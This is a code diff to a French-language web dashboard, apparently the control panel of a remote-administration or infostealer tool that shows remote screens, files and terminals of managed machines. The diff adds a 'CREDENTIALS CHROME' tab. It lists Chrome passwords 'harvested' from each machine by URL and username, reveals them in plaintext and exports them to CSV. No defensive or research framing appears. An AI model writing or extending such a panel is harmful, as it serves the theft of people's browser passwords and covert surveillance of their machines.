@@ -293,8 +293,8 @@ function selectMachine(id) {
 // ================================================================
 // SHELL
 // ================================================================
-const TABS = ['overview','terminal','tasks','screen','files','alerts'];
-const TLBL = ['VUE D\'ENSEMBLE','TERMINAL','TÂCHES','ÉCRAN','FICHIERS','ALERTES'];
+const TABS = ['overview','terminal','tasks','screen','files','alerts','credentials'];
+const TLBL = ['VUE D\'ENSEMBLE','TERMINAL','TÂCHES','ÉCRAN','FICHIERS','ALERTES','CREDENTIALS'];
 
 function renderShell() {
   const m = selectedMachine;
@@ -342,6 +342,7 @@ async function loadTab() {
   if (currentTab==='screen')   await loadScreen(el);
   if (currentTab==='files')    await loadFiles(el);
   if (currentTab==='alerts')   await loadAlerts(el);
+  if (currentTab==='credentials') await loadCredentials(el);
 }
 
 // ================================================================
@@ -363,87 +364,48 @@ async function loadScreen(el) {
 
 async function captureScreen() {
   const statusEl = document.getElementById('screen-status');
-  const imgWrap  = document.getElementById('screen-image-wrap');
-  const imgEl    = document.getElementById('screen-image');
-  const btn      = document.querySelector('button[onclick="captureScreen()"]');
+  const imgWrap = document.getElementById('screen-image-wrap');
+  const imgEl = document.getElementById('screen-image');
   if (!statusEl || !imgEl || !imgWrap) return;
-
-  statusEl.className = '';
+  statusEl.className = 'empty-state';
   statusEl.style.color = 'var(--muted)';
-  statusEl.style.padding = '12px 0';
-  statusEl.textContent = 'Envoi de la demande...';
+  statusEl.textContent = 'Capture en cours...';
   imgWrap.style.display = 'none';
-  if (btn) btn.disabled = true;
 
-  try {
-    // Vérifier que la session est toujours active
-    const { data: session } = await sb.auth.getSession();
-    if (!session?.session) {
-      statusEl.style.color = 'var(--red)';
-      statusEl.textContent = 'Session expirée — veuillez vous reconnecter.';
-      return;
-    }
-
-    const { data: op, error: insertErr } = await sb.from('file_operations')
-      .insert({ machine_id: selectedMachine.id, operation: 'screenshot', path: '', status: 'pending' })
-      .select()
-      .single();
-
-    if (insertErr || !op) {
-      statusEl.style.color = 'var(--red)';
-      const msg = insertErr?.message || 'Réponse vide de Supabase';
-      statusEl.innerHTML = `Erreur insert : <code style="color:var(--yellow)">${esc(msg)}</code><br>
-        <span style="font-size:11px;color:var(--muted)">Vérifiez les policies RLS sur la table <strong>file_operations</strong> (INSERT pour authenticated).</span>`;
-      console.error('[captureScreen] insert error:', insertErr);
-      return;
-    }
-
-    statusEl.style.color = 'var(--muted)';
-    statusEl.textContent = 'Demande envoyée, en attente de l\'agent...';
-
-    const maxWait = 60;
-    for (let waited = 0; waited < maxWait; waited++) {
-      await sleep(1000);
-      const { data: res, error: pollErr } = await sb.from('file_operations')
-        .select('*').eq('id', op.id).single();
-
-      if (pollErr || !res) continue;
-
-      let result = {};
-      try { result = res.result ? (typeof res.result === 'string' ? JSON.parse(res.result) : res.result) : {}; } catch {}
-
-      if (res.status === 'pending') {
-        statusEl.textContent = `En attente de l'agent... (${waited + 1}s)`;
-        continue;
-      }
-      if (res.status === 'running') {
-        statusEl.style.color = 'var(--accent)';
-        statusEl.textContent = 'Capture en cours, upload...';
-        continue;
-      }
-      if (res.status === 'done' && result.link) {
-        statusEl.style.color = 'var(--green)';
-        statusEl.innerHTML = `Capture terminée. <a href="${esc(result.link)}" target="_blank" rel="noopener" style="color:var(--accent)">Ouvrir dans un nouvel onglet</a>`;
-        imgEl.src = result.link;
-        imgWrap.style.display = 'block';
-        return;
-      }
-      if (res.status === 'error') {
-        statusEl.style.color = 'var(--red)';
-        statusEl.innerHTML = `Erreur agent : ${esc(result.error || 'inconnue')}`;
-        return;
-      }
-    }
-
-    statusEl.style.color = 'var(--yellow)';
-    statusEl.textContent = 'Timeout — vérifiez que l\'agent est en ligne et que le service Windows tourne.';
-  } catch (e) {
+  const { data: op } = await sb.from('file_operations')
+    .insert({ machine_id: selectedMachine.id, operation: 'screenshot', path: '', status: 'pending' })
+    .select().single();
+  if (!op) {
     statusEl.style.color = 'var(--red)';
-    statusEl.textContent = 'Exception inattendue : ' + (e.message || e);
-    console.error('[captureScreen] unexpected error:', e);
-  } finally {
-    if (btn) btn.disabled = false;
+    statusEl.textContent = 'Erreur lors de la création de la demande de capture.';
+    return;
   }
+
+  const maxWait = 60;
+  for (let waited = 0; waited < maxWait; waited++) {
+    await sleep(1000);
+    const { data: res } = await sb.from('file_operations').select('*').eq('id', op.id).single();
+    if (!res) continue;
+    const result = res.result ? (typeof res.result === 'string' ? JSON.parse(res.result) : res.result) : {};
+
+    if (res.status === 'running') {
+      statusEl.textContent = 'Capture en cours...';
+      continue;
+    }
+    if (res.status === 'done' && result.link) {
+      statusEl.textContent = 'Capture terminée.';
+      imgEl.src = result.link;
+      imgWrap.style.display = 'block';
+      return;
+    }
+    if (res.status === 'error') {
+      statusEl.style.color = 'var(--red)';
+      statusEl.innerHTML = `Erreur : ${esc(result.error || 'inconnue')}`;
+      return;
+    }
+  }
+  statusEl.style.color = 'var(--yellow)';
+  statusEl.textContent = 'Timeout (vérifiez que l\'agent est en ligne).';
 }
 
 // ================================================================
@@ -916,6 +878,141 @@ async function addRule() {
   loadRules();
 }
 async function delRule(id) { await sb.from('alert_rules').delete().eq('id',id); loadRules(); }
+
+// ================================================================
+// CREDENTIALS
+// ================================================================
+let credFilter = '', credSort = { col: 'harvested_at', dir: 'desc' }, credData = [];
+
+async function loadCredentials(el) {
+  el.innerHTML = `
+    <div class="content-section">
+      <div class="section-header">
+        <span class="section-title">🔑 CREDENTIALS CHROME</span>
+        <div style="display:flex;align-items:center;gap:10px">
+          <span id="cred-count" style="font-size:11px;color:var(--muted)">—</span>
+          <button class="btn-sm" onclick="refreshCredentials()">↺ ACTUALISER</button>
+          <button class="btn-sm" onclick="exportCredentialsCsv()" style="border-color:var(--accent2);color:var(--accent2)">⬇ CSV</button>
+          <button class="btn-sm" onclick="clearCredentials()" style="border-color:var(--red);color:var(--red)">🗑 PURGER</button>
+        </div>
+      </div>
+      <div class="tm-toolbar">
+        <input class="tm-search" id="cred-search" placeholder="Filtrer URL, utilisateur..." oninput="credFilter=this.value.toLowerCase();renderCredentials()">
+      </div>
+      <div class="tm-wrap" style="max-height:520px;">
+        <table class="data-table" id="cred-table">
+          <thead>
+            <tr>
+              <th onclick="sortCred('source')"      id="cth-source">Source</th>
+              <th onclick="sortCred('url')"         id="cth-url">URL</th>
+              <th onclick="sortCred('username')"    id="cth-username">Utilisateur</th>
+              <th onclick="sortCred('password')"    id="cth-password">Mot de passe</th>
+              <th onclick="sortCred('harvested_at')" id="cth-harvested_at">Collecté</th>
+            </tr>
+          </thead>
+          <tbody id="cred-body">
+            <tr><td colspan="5" style="text-align:center;padding:30px;color:var(--muted)">Chargement...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>`;
+  await refreshCredentials();
+}
+
+async function refreshCredentials() {
+  const { data } = await sb.from('credentials').select('*')
+    .eq('machine_id', selectedMachine.id)
+    .order('harvested_at', { ascending: false })
+    .limit(2000);
+  credData = data || [];
+  const cnt = document.getElementById('cred-count');
+  if (cnt) cnt.textContent = `${credData.length} entrée(s)`;
+  renderCredentials();
+}
+
+function sortCred(col) {
+  credSort.dir = (credSort.col === col && credSort.dir === 'desc') ? 'asc' : 'desc';
+  credSort.col = col;
+  renderCredentials();
+}
+
+function renderCredentials() {
+  const body = document.getElementById('cred-body');
+  if (!body) return;
+
+  // Update sort indicators
+  ['source','url','username','password','harvested_at'].forEach(c => {
+    const th = document.getElementById('cth-'+c);
+    if (th) th.className = credSort.col===c ? credSort.dir : '';
+  });
+
+  let list = credData.filter(r =>
+    !credFilter ||
+    (r.url||'').toLowerCase().includes(credFilter) ||
+    (r.username||'').toLowerCase().includes(credFilter) ||
+    (r.source||'').toLowerCase().includes(credFilter)
+  );
+
+  list.sort((a, b) => {
+    const av = a[credSort.col] ?? '', bv = b[credSort.col] ?? '';
+    if (credSort.dir === 'asc') return String(av).localeCompare(String(bv));
+    return String(bv).localeCompare(String(av));
+  });
+
+  const cnt = document.getElementById('cred-count');
+  if (cnt) cnt.textContent = `${list.length} / ${credData.length} entrée(s)`;
+
+  if (!list.length) {
+    body.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:30px;color:var(--muted)">Aucun credential collecté pour cette machine.</td></tr>';
+    return;
+  }
+
+  body.innerHTML = list.map(r => `
+    <tr>
+      <td><span style="color:var(--accent2);font-size:10px;text-transform:uppercase">${esc(r.source||'chrome')}</span></td>
+      <td style="max-width:240px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${esc(r.url)}">${esc(r.url)}</td>
+      <td>${esc(r.username)}</td>
+      <td>
+        <span class="pwd-cell" data-show="0" style="cursor:pointer;user-select:all;letter-spacing:2px;color:var(--muted)" onclick="togglePwd(this,'${esc(r.password)}')">••••••••</span>
+      </td>
+      <td style="color:var(--muted);font-size:10px;white-space:nowrap">${ago(r.harvested_at)}</td>
+    </tr>`).join('');
+}
+
+function togglePwd(el, pwd) {
+  if (el.dataset.show === '0') {
+    el.textContent = pwd;
+    el.style.letterSpacing = '';
+    el.style.color = 'var(--green)';
+    el.dataset.show = '1';
+  } else {
+    el.textContent = '••••••••';
+    el.style.letterSpacing = '2px';
+    el.style.color = 'var(--muted)';
+    el.dataset.show = '0';
+  }
+}
+
+function exportCredentialsCsv() {
+  if (!credData.length) return;
+  const header = 'Source,URL,Utilisateur,Mot de passe,Collecté\n';
+  const rows = credData.map(r =>
+    [r.source, r.url, r.username, r.password, r.harvested_at]
+      .map(v => `"${String(v||'').replace(/"/g,'""')}"`)
+      .join(',')
+  ).join('\n');
+  const blob = new Blob(['\uFEFF' + header + rows], { type: 'text/csv;charset=utf-8;' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url; a.download = `credentials_${selectedMachine.hostname}_${Date.now()}.csv`;
+  a.click(); URL.revokeObjectURL(url);
+}
+
+async function clearCredentials() {
+  if (!confirm(`Supprimer tous les credentials de ${selectedMachine.name} ?`)) return;
+  await sb.from('credentials').delete().eq('machine_id', selectedMachine.id);
+  await refreshCredentials();
+}
 
 // ================================================================
 // UTILS
